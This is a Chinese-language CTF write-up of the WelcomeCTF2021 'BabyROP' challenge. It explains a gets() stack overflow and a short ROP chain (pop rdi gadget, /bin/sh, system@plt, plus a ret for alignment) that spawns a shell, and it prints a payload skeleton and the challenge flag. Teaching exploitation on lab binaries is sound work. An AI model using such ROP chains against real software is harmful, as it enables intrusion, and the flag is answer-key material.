# BabyROP

## 题目简述

WelcomeCTF2021 的 BabyROP 是 64 位基础 ROP 题。程序在 32 字节栈缓冲区上调用 `gets`，二进制关闭 PIE 和栈保护并启用 NX；程序内已有 `system`，全局变量 `favorite_shell` 指向 `/bin/sh`。

## 解题过程

从缓冲区起始位置到保存的返回地址共 40 字节。由于 NX 阻止直接执行栈上 shellcode，只需借用现有代码完成

```c
system("/bin/sh");
```

System V AMD64 ABI 使用 `RDI` 传递第一个参数。二进制中可以找到 `pop rdi; ret`，并直接取得 `/bin/sh` 字符串与 `system@plt` 的固定地址。官方脚本构造：

```python
payload = b"A" * 40
payload += p64(ret_gadget)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(system_plt)
```

开头额外的单独 `ret` 用于修正 16 字节栈对齐，避免 `system` 内部使用对齐指令时崩溃。发送 payload 后进入 shell，读取 `flag.txt`：

```text
greyhats{4n_e4sy_0ne_f0r_y0u_82hhd2dh8dh}
```

## 方法总结

该题展示最短的 ret2libc/ROP 链：确认覆盖偏移，控制 `RDI`，复用二进制已有字符串和 PLT 函数。即使所有地址固定，也要关注 ABI 栈对齐；“本地可跳转到 system”不等于调用现场一定合法。
